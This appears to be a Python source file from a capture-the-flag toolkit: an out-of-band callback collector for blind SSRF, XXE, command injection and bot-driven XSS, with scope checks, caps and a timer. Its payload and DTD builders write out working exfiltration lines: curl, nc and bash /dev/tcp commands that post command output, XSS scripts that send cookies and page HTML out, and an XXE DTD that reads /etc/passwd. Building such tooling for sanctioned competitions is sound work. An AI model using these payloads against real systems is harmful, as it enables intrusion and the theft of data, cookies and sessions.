#!/usr/bin/env python3
"""Out-of-band collector for blind web classes.

A hand tool for a live web target: blind SSRF, blind/OOB XXE, blind command injection and an XSS that
needs a victim bot all need a URL the TARGET can call back to. This is that URL: an HTTP listener and a
raw TCP catcher on this Mac, bound to one local address (the event VPN's own tunnel address, or one you
name), or reached through a cloudflared quick tunnel. Stdlib only; no third-party service; nothing is
sent anywhere by this tool but its own answers to the requests it receives. Point it at your assigned
target only; never scan or flood.

  .venv/bin/python tools/oob.py addr   [--bind A]
  .venv/bin/python tools/oob.py up     [--bind A] [--port N] [--tcp-port N] [--minutes M]
  .venv/bin/python tools/oob.py up     --public [--port N] [--minutes M]
  .venv/bin/python tools/oob.py down
  .venv/bin/python tools/oob.py status
  .venv/bin/python tools/oob.py selftest
  .venv/bin/python tools/oob.py token  <label>
  .venv/bin/python tools/oob.py url    <token> [path] [--base URL]
  .venv/bin/python tools/oob.py hits   [--token T] [--follow S] [--json] [--all]
  .venv/bin/python tools/oob.py dtd    <token> <file-to-read> [--php] [--base URL]
  .venv/bin/python tools/oob.py payloads <token> [--base URL]
  .venv/bin/python tools/oob.py reach  [--target IP] [--wait S] [--json]

addr      The address a target can reach us on. When the event config declares `vpn_ranges` (the event
          VPN's split tunnel; tools/target.py, $CTF_VPN_RANGES), it is the IPv4 address of the ONE utun
          interface that holds an address in those ranges. A LAN address that happens to lie in a range
          (en0) is never chosen: only a utun interface is the tunnel. None, or two, is a refusal (exit 2)
          that says why. Without `vpn_ranges` nothing is guessed: `--bind A` is required. `--bind A`
          names an address explicitly; it must be an IPv4 address of this Mac, and a wildcard (0.0.0.0,
          ::) is refused even then. A named address that is not the tunnel (or loopback) is allowed with
          one WARN line.
up        Starts the listener in the background, bound to that address only: HTTP on --port (default
          8380) and a raw TCP catcher on --tcp-port (default 8381; 0 turns it off). It stops by itself
          after --minutes (default 60, at most 480), after HIT_CAP requests, or once LOG_CAP bytes are
          logged. One listener at a time.
          --public (a cloudflared quick tunnel): for a target that cannot reach a private address on this
          Mac. The listener binds 127.0.0.1 only and starts `cloudflared tunnel --url
          http://127.0.0.1:<port> --no-autoupdate`
          beside it ($CTF_CLOUDFLARED, else `cloudflared` on PATH, else /opt/homebrew/bin/cloudflared);
          the https://<name>.trycloudflare.com URL it prints is recorded in the state, and url, payloads and
          dtd use it as their base. HTTP only: the raw TCP catcher cannot be reached through a quick tunnel,
          so it is off. A hit arrives from cloudflared (peer 127.0.0.1); its CF-Connecting-IP (else the first
          X-Forwarded-For) header is logged as `real_peer`. The timer, the caps and `down` stop both.
          Anyone on the internet who learns the URL can reach the listener: it still only answers `ok` or a
          served file, and stops by its caps.
down      Stops it (only a process whose command line is this tool's `_serve`), and its cloudflared.
status    Up or down, the address, the time left, the hit count, and the macOS firewall's state.
selftest  One HTTP request and one TCP line to the bound address from this Mac, and checks both were
          logged. It proves the listener answers on its address; it does NOT prove a target can reach it
          (local traffic passes the macOS firewall, and the route from a target to the tunnel is untested).
          With --public it also sends one request to the public URL (through Cloudflare, from this Mac;
          our own request, no target) and checks it was logged with a real_peer.
token     Mints a random token (`o` + 12 hex digits) for a label, so a hit is attributable to a payload.
url       The callback URL for a token (`http://A:P/<token>/<path>`, or `https://<name>.trycloudflare.com/...`).
hits      Prints the logged requests (today's, or every day's with --all), one block each; --token keeps
          one token's; --follow S waits S seconds (at most 900) for new ones; --json prints the rows.
dtd       Writes the standard parameter-entity exfil DTD for a file to challenges/_oob/serve/<token>.dtd
          (served at /f/<token>.dtd) and prints the XML payload that loads it. --php reads the file
          through php://filter as base64 (a file with newlines or `%` breaks the plain URL form).
payloads  Copy-ready callbacks for a token: blind RCE (curl, wget, python, busybox nc, bash /dev/tcp,
          powershell), SSRF, an XSS cookie/DOM exfil (fetch, img beacon) and the XXE pointer.
reach     Whether a target can reach the listener, per event (B-255), saved to challenges/_oob/reach.json
          (the event's workdir). It never assumes: CONFIRMED (exit 0) only when a hit carrying one of our
          tokens came from an address that is not this Mac's since this listener started; PLAUSIBLE
          (exit 3) when the listener answers locally on a route that should work (the VPN tunnel, the
          target in its ranges, or a quick tunnel); UNPROVEN (exit 3) when the route is unknown;
          UNUSABLE (exit 1) when it is down, bound to loopback or does not answer. It sends one request
          to this Mac's own listener and nothing to any target: it prints the event's reach-probe URL
          for the player to have the target fetch through a vector the event allows, and --wait S
          watches for that callback. Firing at a live target stays the event's rules and the player's.

Every request is logged whole (method, path, headers, body up to 1 MiB, peer, time, the token it
carries) to challenges/_oob/<YYYY-MM-DD>/hits.jsonl; a TCP connection is logged with up to TCP_CAP bytes
it sent. The listener never runs, evaluates or follows anything it receives: it answers `ok`, or a file
from challenges/_oob/serve/ named by a flat name under /f/. It is never imported by the solve path.
Paths follow $CTF_WORKDIR (tests), else <repo>/challenges.

Scope (R-13): the only connections this tool opens are its own. `selftest` connects only to an
address of this Mac (loopback or an interface address `ifconfig` lists), whatever the state file
says. Cloudflare is a public third-party service, not a target: `up --public` (cloudflared) and the
selftest's public probe run only when the event profile's rules.public_fetch_allow lists the quick
tunnel's hosts (an entry such as "*.trycloudflare.com"); otherwise they are refused (exit 2) with
the reason, before cloudflared starts or any request leaves (ctf.scope.check_public_fetch).
"""
import argparse
import base64
import ipaddress
import json
import os
import re
import secrets
import shutil
import signal
import socket
import socketserver
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import paths as ctf_paths, scope
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[1]))
    from ctf import paths as ctf_paths, scope

ROOT = Path(__file__).resolve().parent.parent
WILDCARDS = ("0.0.0.0", "::", "", "*", "0", "::0", "0:0:0:0:0:0:0:0")

HTTP_PORT = 8380
TCP_PORT = 8381
MINUTES = 60
MAX_MINUTES = 480
BODY_CAP = 1 << 20          # bytes of a request body that are read and logged (1 MiB)
TCP_CAP = 1 << 16           # bytes of a TCP connection that are read and logged
HIT_CAP = 2000              # requests and connections, then the listener stops
LOG_CAP = 64 << 20          # bytes written to hits.jsonl by one listener, then it stops
CONN_TIMEOUT = 10.0         # seconds a connection may sit idle
FOLLOW_MAX = 900.0
TOKEN = re.compile(r"o[0-9a-f]{12}")
SERVE_NAME = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]{0,120}")
SAFE_FILE = re.compile(r"[A-Za-z0-9/._~:+@=,-]{1,300}")
CF_DEFAULT = "/opt/homebrew/bin/cloudflared"
CF_WAIT = 45.0              # seconds the quick tunnel has to print its URL
PUBLIC_URL = re.compile(r"https://(?!api\.)[a-z0-9][a-z0-9-]{0,62}\.trycloudflare\.com")
PUBLIC_BASE = re.compile(r"https://[a-z0-9][a-z0-9-]{0,62}\.trycloudflare\.com/?")
LOOPBACK = "127.0.0.1"
CF_API_HOST = "api.trycloudflare.com"   # the quick-tunnel service cloudflared registers with (and the edge probe)
TYPES = {".dtd": "application/xml-dtd", ".xml": "application/xml", ".js": "application/javascript",
         ".html": "text/html", ".txt": "text/plain", ".svg": "image/svg+xml", ".json": "application/json"}


class Refused(Exception):
    """A bind or an argument this tool will not take; the message is one line for the player."""


class OutOfScope(Refused, scope.OutOfScope):
    """A connection this tool will not open (ctf.scope): not this Mac's own listener, or a public
    service the event profile does not allow. Raised before any socket or subprocess."""


def check_own_address(addr, ifaces=None) -> str:
    """`addr` when it is loopback or an IPv4 address of this Mac (the listener's own), else OutOfScope.
    selftest connects only there, whatever the state file names."""
    a = str(addr or "").strip()
    try:
        ip = ipaddress.ip_address(a)
    except ValueError:
        raise OutOfScope(f"refused: selftest connects only to this Mac's own listener; {a!r} is not an address") from None
    if ip.is_loopback:
        return a
    mine = {x for _, x in (interfaces() if ifaces is None else ifaces)}
    if a not in mine:
        raise OutOfScope(f"refused: selftest connects only to this Mac's own listener; {a} is not an address of "
                         f"this Mac (have: {', '.join(sorted(mine)) or 'none read'})")
    return a


def check_public(host, purpose) -> str:
    """ctf.scope.check_public_fetch for a Cloudflare quick-tunnel host; OutOfScope (a Refused) when the
    event profile's rules.public_fetch_allow does not list it."""
    return scope.check_public_fetch(host, purpose=purpose, error=OutOfScope)


# ------------------------------------------------------------------------------------------- paths

def home() -> Path:
    return ctf_paths.workdir() / "_oob"


def today() -> str:
    return datetime.now().strftime("%Y-%m-%d")


def hits_path(day=None) -> Path:
    return home() / (day or today()) / "hits.jsonl"


def serve_dir() -> Path:
    return home() / "serve"


def state_path() -> Path:
    return home() / "state.json"


def tokens_path() -> Path:
    return home() / "tokens.json"


def _read_json(path, default):
    try:
        return json.loads(Path(path).read_text())
    except (OSError, ValueError):
        return default


def _write_json(path, obj):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_name(path.name + f".{os.getpid()}.tmp")
    tmp.write_text(json.dumps(obj, indent=1, sort_keys=True))
    os.replace(tmp, path)


# -------------------------------------------------------------------------------------- addresses

def interfaces(text=None) -> list:
    """[(interface, IPv4 address)] from `ifconfig` output (given, or read from /sbin/ifconfig)."""
    if text is None:
        try:
            text = subprocess.run(["/sbin/ifconfig"], capture_output=True, text=True, timeout=5).stdout
        except (OSError, subprocess.SubprocessError):
            text = ""
    out, name = [], None
    for line in text.splitlines():
        m = re.match(r"^([A-Za-z0-9]+):\s", line)
        if m:
            name = m.group(1)
            continue
        m = re.match(r"^\s+inet\s+(\d{1,3}(?:\.\d{1,3}){3})\b", line)
        if m and name:
            out.append((name, m.group(1)))
    return out


def event_ranges() -> tuple:
    """The event VPN's ranges from the event config (tools/target.py), () when it declares none. A
    config that cannot be read or holds a bad range is loud (target.py raises), never ()."""
    here = str(Path(__file__).resolve().parent)
    if here not in sys.path:
        sys.path.insert(0, here)
    import target
    return tuple(target.event_ranges())


def in_tunnel(addr, ranges) -> bool:
    try:
        ip = ipaddress.ip_address(str(addr))
    except ValueError:
        return False
    return ip.version == 4 and any(ip in ipaddress.ip_network(n) for n in ranges)


def choose_address(ifaces, bind=None, ranges=None) -> tuple:
    """(address, notes) to bind, or Refused. `ranges` are the event VPN's CIDRs (read from the event
    config when None; () means none declared). Without `bind`: the one utun interface in those
    ranges, and a refusal when no ranges are declared (nothing is guessed). With `bind`: that exact
    IPv4 address of this Mac, never a wildcard. (`up --public` takes the cloudflared path instead and
    never comes here.)"""
    notes = []
    ranges = event_ranges() if ranges is None else tuple(ranges)
    if bind is None:
        if not ranges:
            raise Refused("refused: the event config declares no vpn_ranges, so there is no tunnel address to "
                          "pick: name the address the assigned target can reach this Mac on with --bind A (an "
                          "IPv4 address of this Mac), or use --public for a cloudflared quick tunnel; this tool "
                          "never binds a wildcard")
        tunnel = [(i, a) for i, a in ifaces if i.startswith("utun") and in_tunnel(a, ranges)]
        if not tunnel:
            lan = [f"{a} on {i}" for i, a in ifaces if in_tunnel(a, ranges)]
            extra = f"; {', '.join(lan)} is in the ranges but is no tunnel interface" if lan else ""
            raise Refused(f"refused: no utun interface holds an address in the event VPN's ranges "
                          f"({', '.join(ranges)}): the VPN is not up (tools/vpn.py up){extra}; "
                          "--bind A names an address explicitly")
        if len(tunnel) > 1:
            raise Refused("refused: more than one tunnel address (" + ", ".join(f"{a} on {i}" for i, a in tunnel)
                          + "); name one with --bind")
        return tunnel[0][1], notes
    b = str(bind).strip()
    if b in WILDCARDS or b.startswith("0.0.0.0"):
        raise Refused(f"refused: {b or 'an empty address'} is a wildcard and would listen on every interface")
    try:
        ip = ipaddress.ip_address(b)
    except ValueError:
        raise Refused(f"refused: --bind takes one IPv4 address, not {b!r}")
    if ip.version != 4 or ip.is_unspecified or ip.is_multicast:
        raise Refused(f"refused: {b} is not a unicast IPv4 address")
    mine = {a: i for i, a in ifaces}
    if b not in mine:
        raise Refused(f"refused: {b} is not an address of this Mac (have: "
                      f"{', '.join(f'{a} on {i}' for i, a in ifaces) or 'none read'})")
    if ip.is_loopback:
        notes.append(f"WARN {b} is loopback: no target can reach it (selftest and tests only)")
    elif not (ranges and mine[b].startswith("utun") and in_tunnel(b, ranges)):
        notes.append(f"WARN {b} on {mine[b]} is not the event VPN tunnel: it is bound because --bind named it; "
                     "anything that can reach this address can reach the listener; keep it pointed only at "
                     "your assigned target")
    return b, notes


def firewall_state() -> str:
    """The macOS application firewall's own words, or '' when it cannot be read (no sudo needed)."""
    fw = "/usr/libexec/ApplicationFirewall/socketfilterfw"
    words = []
    for flag in ("--getglobalstate", "--getstealthmode"):
        try:
            r = subprocess.run([fw, flag], capture_output=True, text=True, timeout=5)
            words.append(" ".join(r.stdout.split()))
        except (OSError, subprocess.SubprocessError):
            pass
    return "; ".join(w for w in words if w)


# ----------------------------------------------------------------------------------------- tokens

def mint(label) -> str:
    label = " ".join(str(label or "").split())[:80]
    if not label:
        raise Refused("token needs a label (what the payload is for)")
    tok = "o" + secrets.token_hex(6)
    toks = _read_json(tokens_path(), {})
    toks[tok] = {"label": label, "minted": datetime.now().isoformat(timespec="seconds")}
    _write_json(tokens_path(), toks)
    return tok


def check_token(tok) -> str:
    if not TOKEN.fullmatch(str(tok or "")):
        raise Refused(f"not a token of this tool: {tok!r} (oob.py token <label> mints one)")
    return tok


def tokens_in(text, known) -> list:
    return sorted({t for t in TOKEN.findall(text or "") if t in known})


# ---------------------------------------------------------------------------------------- builders

def base_url(addr, port) -> str:
    return f"http://{addr}:{int(port)}"


def build_url(base, tok, path="") -> str:
    check_token(tok)
    path = str(path or "").lstrip("/")
    return f"{base.rstrip('/')}/{tok}" + (f"/{path}" if path else "")


def build_dtd(base, tok, target_file, php=False) -> tuple:
    """(DTD text, XML payload) for an out-of-band XXE read of target_file."""
    check_token(tok)
    f = str(target_file or "")
    if not SAFE_FILE.fullmatch(f):
        raise Refused("the file to read may hold only letters, digits and / . _ ~ : + @ = , - (no quote, %, < or >)")
    if php:
        src = f"php://filter/convert.base64-encode/resource={f}"
    elif "://" in f:
        src = f
    else:
        src = "file://" + (f if f.startswith("/") else "/" + f)
    dtd = (f'<!ENTITY % file SYSTEM "{src}">\n'
           f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{build_url(base, tok, "xxe")}?d=%file;\'>">\n'
           "%eval;\n%exfil;\n")
    payload = ('<?xml version="1.0"?>\n'
               f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "{base.rstrip("/")}/f/{tok}.dtd"> %ext;]>\n'
               "<r>1</r>")
    return dtd, payload


def is_public(base) -> bool:
    return bool(PUBLIC_BASE.fullmatch(str(base or "")))


def build_payloads(base, tok, tcp=None) -> list:
    """[(class, label, text)] copy-ready callbacks. `tcp` is (address, port) of the TCP catcher or None.
    A public (quick tunnel) base is HTTP only: no TCP catcher line, and one line that says so."""
    u = lambda p: build_url(base, tok, p)  # noqa: E731
    if is_public(base):
        tcp = None
    out = [
        ("rce", "curl (POST the command's output)", f'curl -s -m 5 --data-binary "$(id 2>&1)" {u("rce")}'),
        ("rce", "wget", f'wget -q -T 5 -O- --post-data="$(id 2>&1)" {u("rce")}'),
        ("rce", "python3",
         "python3 -c 'import urllib.request,subprocess;urllib.request.urlopen(\"" + u("rce") + "\","
         "subprocess.run(\"id\",shell=True,capture_output=True).stdout,timeout=5)'"),
        ("rce", "powershell",
         f'powershell -nop -c "iwr -UseBasicParsing -TimeoutSec 5 -Method POST -Uri {u("rce")} -Body (whoami|out-string)"'),
        ("rce", "ping only (it ran)", f"curl -s -m 5 {u('ping')} || wget -q -T 5 -O- {u('ping')}"),
    ]
    if tcp:
        a, p = tcp
        out += [
            ("rce", "busybox nc (TCP catcher)", f"id 2>&1 | busybox nc {a} {p}"),
            ("rce", "nc (TCP catcher)", f"id 2>&1 | nc -w 5 {a} {p}"),
            ("rce", "bash /dev/tcp (TCP catcher)", f"bash -c 'id >/dev/tcp/{a}/{p} 2>&1'"),
        ]
    elif is_public(base):
        out.append(("rce", "no raw TCP through a quick tunnel (HTTP only)",
                    "# raw TCP callbacks (netcat, bash's dev-tcp redirection) cannot reach this collector: use "
                    "the curl, wget, python3 or powershell callbacks above (https)"))
    out += [
        ("ssrf", "fetch-a-URL parameter (the hit's headers show the server-side client)", u("ssrf")),
        ("xss", "fetch beacon (cookie and page URL)",
         '<script>fetch("' + u("xss") + '?c="+encodeURIComponent(document.cookie)+"&u="'
         '+encodeURIComponent(location.href),{mode:"no-cors"})</script>'),
        ("xss", "img beacon (no script tag)",
         '<img src=x onerror="new Image().src=\'' + u("xss") + '?c=\'+encodeURIComponent(document.cookie)">'),
        ("xss", "DOM exfil (the page the bot sees)",
         '<script>fetch("' + u("dom") + '",{method:"POST",mode:"no-cors",body:document.documentElement.outerHTML})</script>'),
        ("xxe", "out-of-band XXE", f"oob.py dtd {tok} /etc/passwd   (prints the XML payload)"),
    ]
    return out


# ---------------------------------------------------------------------------------------- listener

class Log:
    """Append-only hits.jsonl writer shared by both servers; counts hits and bytes for the caps."""

    def __init__(self, stop):
        self.lock = threading.Lock()
        self.hits = 0
        self.bytes = 0
        self.stop = stop

    def write(self, row) -> None:
        with self.lock:
            if self.hits >= HIT_CAP or self.bytes >= LOG_CAP:
                return
            known = _read_json(tokens_path(), {})
            hay = json.dumps(row, ensure_ascii=False)
            row["tokens"] = tokens_in(hay, known)
            row["labels"] = [known[t].get("label", "") for t in row["tokens"]]
            line = json.dumps(row, ensure_ascii=False, sort_keys=True) + "\n"
            p = hits_path()
            p.parent.mkdir(parents=True, exist_ok=True)
            with open(p, "a", encoding="utf-8") as fh:
                fh.write(line)
            self.hits += 1
            self.bytes += len(line.encode())
            if self.hits >= HIT_CAP or self.bytes >= LOG_CAP:
                self.stop.set()


def _body_fields(data, truncated) -> dict:
    out = {"body_len": len(data), "truncated": bool(truncated)}
    try:
        out["body"] = data.decode("utf-8")
    except UnicodeDecodeError:
        out["body_b64"] = base64.b64encode(data).decode()
    return out


def _now() -> dict:
    t = time.time()
    return {"time": datetime.fromtimestamp(t).isoformat(timespec="milliseconds"), "epoch": round(t, 3)}


def real_peer(peer, headers) -> str:
    """The caller behind cloudflared: CF-Connecting-IP, else the first X-Forwarded-For entry. Read only when
    the connection itself came from loopback (the quick tunnel's own hop); on a tunnel-address listener a
    target could write these headers itself, so they are logged as headers and never as the peer."""
    if str(peer) != LOOPBACK or headers is None:
        return ""
    v = (headers.get("CF-Connecting-IP") or "").strip()
    if not v:
        v = (headers.get("X-Forwarded-For") or "").split(",")[0].strip()
    return v[:64]


def make_handler(log):
    class Handler(BaseHTTPRequestHandler):
        server_version = "oob"
        sys_version = ""
        protocol_version = "HTTP/1.0"
        timeout = CONN_TIMEOUT

        def log_message(self, *a):   # the jsonl is the log
            pass

        def _read_body(self):
            te = (self.headers.get("Transfer-Encoding") or "").lower()
            if "chunked" in te:
                buf, cut = b"", False
                while len(buf) < BODY_CAP:
                    size_line = self.rfile.readline(64)
                    try:
                        size = int(size_line.split(b";")[0].strip() or b"0", 16)
                    except ValueError:
                        break
                    if size <= 0:
                        break
                    take = min(size, BODY_CAP - len(buf))
                    buf += self.rfile.read(take)
                    if take < size:
                        cut = True
                        break
                    self.rfile.readline(8)
                return buf, cut or len(buf) >= BODY_CAP
            try:
                n = int(self.headers.get("Content-Length") or 0)
            except ValueError:
                n = 0
            n = max(0, n)
            data = self.rfile.read(min(n, BODY_CAP)) if n else b""
            return data, n > BODY_CAP

        def send_error(self, code, message=None, explain=None):
            # A request that does not parse (a TLS hello on the HTTP port, an odd version) still
            # reached us: log its first bytes before the error page (review of ba67e6e).
            if not getattr(self, "_logged", False):
                self._logged = True
                raw = bytes(getattr(self, "raw_requestline", b"") or b"")[:4096]
                row = {"kind": "raw", **_now(), "peer": f"{self.client_address[0]}:{self.client_address[1]}",
                       "error": code, **_body_fields(raw, False)}
                log.write(row)
            super().send_error(code, message, explain)

        def _handle(self):
            self._logged = True
            body, cut = self._read_body()
            row = {"kind": "http", **_now(), "peer": f"{self.client_address[0]}:{self.client_address[1]}",
                   "method": self.command, "path": self.path, "version": self.request_version,
                   "headers": [[k, v] for k, v in self.headers.items()], **_body_fields(body, cut)}
            rp = real_peer(self.client_address[0], self.headers)
            if rp:
                row["real_peer"] = rp
            log.write(row)
            if cut:
                self.close_connection = True
            m = re.fullmatch(r"/f/([^/?#]+)(?:\?.*)?", self.path or "")
            if m and SERVE_NAME.fullmatch(m.group(1)) and ".." not in m.group(1):
                f = serve_dir() / m.group(1)
                if f.is_file():
                    data = f.read_bytes()[:BODY_CAP]
                    return self._reply(200, data, TYPES.get(f.suffix.lower(), "application/octet-stream"))
            self._reply(200, b"ok\n", "text/plain")

        def _reply(self, code, data, ctype):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Connection", "close")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(data)

        do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_HEAD = do_OPTIONS = _handle

    return Handler


class TCPCatcher(socketserver.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


def make_tcp_handler(log):
    class Catch(socketserver.BaseRequestHandler):
        def handle(self):
            self.request.settimeout(CONN_TIMEOUT)
            buf = b""
            try:
                while len(buf) < TCP_CAP:
                    chunk = self.request.recv(min(65536, TCP_CAP - len(buf)))
                    if not chunk:
                        break
                    buf += chunk
            except OSError:
                pass
            row = {"kind": "tcp", **_now(), "peer": f"{self.client_address[0]}:{self.client_address[1]}",
                   **_body_fields(buf, len(buf) >= TCP_CAP)}
            log.write(row)
    return Catch


class HTTPCollector(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def cloudflared_path() -> str:
    """$CTF_CLOUDFLARED when set (tests: a fake; used as given, never searched further), else
    `cloudflared` on PATH, else the Homebrew path."""
    env = os.environ.get("CTF_CLOUDFLARED")
    if env:
        return env
    return shutil.which("cloudflared") or CF_DEFAULT


def cf_log_path() -> Path:
    return home() / "cloudflared.log"


class QuickTunnel:
    """`cloudflared tunnel --url http://127.0.0.1:<port> --no-autoupdate` in the background. Its output is
    drained by a thread into cloudflared.log and searched for the trycloudflare URL (never api.*)."""

    def __init__(self, port, binary=None):
        self.port = int(port)
        self.binary = binary or cloudflared_path()
        self.url = None
        self.found = threading.Event()
        self.proc = None

    def start(self):
        if not (os.path.isfile(self.binary) and os.access(self.binary, os.X_OK)):
            raise Refused(f"refused: cloudflared not found at {self.binary} (brew install cloudflared)")
        argv = [self.binary, "tunnel", "--url", f"http://{LOOPBACK}:{self.port}", "--no-autoupdate"]
        home().mkdir(parents=True, exist_ok=True)
        self.proc = subprocess.Popen(argv, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, start_new_session=True)
        threading.Thread(target=self._drain, daemon=True).start()
        return self

    def _drain(self):
        try:
            with open(cf_log_path(), "ab") as logf:
                for line in iter(self.proc.stdout.readline, b""):
                    logf.write(line)
                    logf.flush()
                    if not self.url:
                        m = PUBLIC_URL.search(line.decode("utf-8", "replace"))
                        if m:
                            self.url = m.group(0)
                            self.found.set()
        except (OSError, ValueError):
            pass
        self.found.set()           # the output ended: wake a waiter (url may still be None)

    def wait_url(self, timeout, stop=None) -> str:
        end = time.time() + timeout
        while time.time() < end and not (stop is not None and stop.is_set()):
            if self.found.wait(0.2):
                break
        return self.url

    def stop(self):
        p = self.proc
        if not p or p.poll() is not None:
            return
        try:
            p.terminate()
            p.wait(5)
        except (OSError, subprocess.SubprocessError):
            try:
                p.kill()
            except OSError:
                pass


def serve(addr, port, tcp_port, until, write_state=True, stop=None, ready=None, public=False) -> dict:
    """Run both servers until `until` (epoch), a cap, SIGTERM or `stop` is set. Returns the final counts.
    `ready` (a list) receives the bound (http port, tcp port) once both listen (tests). `public` (row 384):
    the listener is on 127.0.0.1 only, HTTP only, and a cloudflared quick tunnel is started beside it and
    stopped with it; its URL goes into the state as `public_url`."""
    stop = stop or threading.Event()
    if public and addr != LOOPBACK:
        raise Refused(f"refused: --public binds {LOOPBACK} only, not {addr}")
    log = Log(stop)
    httpd = HTTPCollector((addr, port), make_handler(log))
    if public:
        tcp_port = None
    tcpd = TCPCatcher((addr, tcp_port), make_tcp_handler(log)) if tcp_port is not None else None
    for srv in (httpd, tcpd):
        if srv:
            threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.2}, daemon=True).start()
    if ready is not None:
        ready.append((httpd.server_address[1], tcpd.server_address[1] if tcpd else None))
    if write_state:
        _write_json(state_path(), {"pid": os.getpid(), "bind": addr, "port": httpd.server_address[1],
                                   "tcp_port": tcpd.server_address[1] if tcpd else None,
                                   "started": time.time(), "until": until, "day": today(),
                                   "public": bool(public), "public_url": None, "cf_pid": None})
    try:
        signal.signal(signal.SIGTERM, lambda *a: stop.set())
    except ValueError:            # not the main thread (tests)
        pass
    qt = None
    if public:
        try:
            qt = QuickTunnel(httpd.server_address[1]).start()
            url = qt.wait_url(min(CF_WAIT, max(0.0, until - time.time())), stop)
            err = None if url else f"cloudflared printed no trycloudflare URL within {CF_WAIT:.0f} s (see {cf_log_path()})"
        except Refused as e:
            url, err = None, str(e)
        if write_state:
            st = _read_json(state_path(), {})
            if st.get("pid") == os.getpid():
                st.update({"public_url": url, "cf_pid": qt.proc.pid if qt and qt.proc else None,
                           "cf_binary": qt.binary if qt else None})
                if err:
                    st["error"] = err
                _write_json(state_path(), st)
        if ready is not None:
            ready.append(url)
        if err:
            stop.set()
    while not stop.is_set() and time.time() < until:
        if qt and qt.proc and qt.proc.poll() is not None:
            break                  # the tunnel died: the public URL is gone, so stop the listener too
        stop.wait(0.2)
    if qt:
        qt.stop()
    for srv in (httpd, tcpd):
        if srv:
            srv.shutdown()
            srv.server_close()
    if write_state:
        st = _read_json(state_path(), {})
        if st.get("pid") == os.getpid():
            st.update({"stopped": time.time(), "hits": log.hits, "pid": None, "cf_pid": None})
            _write_json(state_path(), st)
    return {"hits": log.hits, "bytes": log.bytes}


# ------------------------------------------------------------------------------------------ control

def _alive(pid) -> bool:
    if not pid:
        return False
    try:
        cmd = subprocess.run(["ps", "-p", str(int(pid)), "-o", "command="], capture_output=True, text=True,
                             timeout=5).stdout
    except (OSError, subprocess.SubprocessError, ValueError):
        return False
    return "oob.py" in cmd and "_serve" in cmd


def running() -> dict:
    st = _read_json(state_path(), {})
    return st if st.get("pid") and _alive(st["pid"]) else {}


def shown_base(st) -> str:
    return st.get("public_url") or base_url(st["bind"], st["port"])


def cmd_up(a) -> int:
    public = bool(getattr(a, "public", False))
    st = running()
    if st:
        print(f"OOB already up: {shown_base(st)} (tcp {st.get('tcp_port')}), "
              f"{max(0, int((st['until'] - time.time()) / 60))} min left; oob.py down first to move it")
        return 0
    if public:
        if a.bind:
            raise Refused(f"refused: --public binds {LOOPBACK} only; --bind does not apply")
        check_public(CF_API_HOST, "oob.py up --public (a cloudflared quick tunnel)")
        cf = cloudflared_path()
        if not (os.path.isfile(cf) and os.access(cf, os.X_OK)):
            raise Refused(f"refused: cloudflared not found at {cf} (brew install cloudflared)")
        addr, notes = LOOPBACK, []
        if a.tcp_port and a.tcp_port != TCP_PORT:
            print("NOTE --public is HTTP only: the raw TCP catcher is off (a quick tunnel carries no raw TCP)")
        a.tcp_port = 0
    else:
        addr, notes = choose_address(interfaces(), a.bind)
    for n in notes:
        print(n)
    minutes = max(1, min(int(a.minutes), MAX_MINUTES))
    until = time.time() + minutes * 60
    home().mkdir(parents=True, exist_ok=True)
    try:
        state_path().unlink()
    except OSError:
        pass
    logf = open(home() / "listener.log", "ab")
    argv = [sys.executable, str(Path(__file__).resolve()), "_serve", "--bind", addr, "--port", str(a.port),
            "--tcp-port", str(a.tcp_port), "--until", str(until)] + (["--public"] if public else [])
    proc = subprocess.Popen(argv, stdin=subprocess.DEVNULL, stdout=logf, stderr=logf, start_new_session=True,
                            env=dict(os.environ))
    for _ in range(50):
        st = _read_json(state_path(), {})
        if st.get("pid") == proc.pid:
            break
        if proc.poll() is not None:
            print(f"OOB NOT UP: the listener exited ({proc.returncode}); see {home() / 'listener.log'}")
            return 1
        time.sleep(0.1)
    else:
        proc.terminate()
        print("OOB NOT UP: the listener did not report within 5 s")
        return 1
    if public:
        end = time.time() + CF_WAIT + 5
        while time.time() < end:
            st = _read_json(state_path(), {})
            if st.get("public_url") or st.get("error") or proc.poll() is not None:
                break
            time.sleep(0.2)
        if not st.get("public_url"):
            if proc.poll() is None:
                proc.terminate()
            print(f"OOB NOT UP: {st.get('error') or 'the quick tunnel gave no URL'}; the listener is stopped")
            return 1
    print(f"OOB UP {shown_base(st)} tcp={st.get('tcp_port')} pid={proc.pid} "
          f"until={datetime.fromtimestamp(until).strftime('%H:%M:%S')} ({minutes} min)")
    print(f"hits: {hits_path()}   next: oob.py token <label>, then oob.py payloads <token>")
    if public:
        print(f"public: {st['public_url']} -> {base_url(LOOPBACK, st['port'])} via cloudflared pid={st.get('cf_pid')}; "
              "HTTP only (no raw TCP catcher); anyone with the URL can reach the listener until it stops")
        return 0
    fw = firewall_state()
    if "enabled" in fw.lower():
        print(f"NOTE macOS firewall: {fw}. An inbound connection from a target may be blocked or raise the "
              "'accept incoming connections' dialog for Python (the player's click); selftest cannot see this")
    return 0


def _cf_alive(pid, port=None) -> bool:
    """A cloudflared quick tunnel of ours: its command line is `... tunnel --url http://127.0.0.1:<port>`."""
    if not pid:
        return False
    try:
        cmd = subprocess.run(["ps", "-p", str(int(pid)), "-o", "command="], capture_output=True, text=True,
                             timeout=5).stdout
    except (OSError, subprocess.SubprocessError, ValueError):
        return False
    want = f"--url http://{LOOPBACK}:" + (str(int(port)) if port else "")
    return "tunnel" in cmd and want in cmd


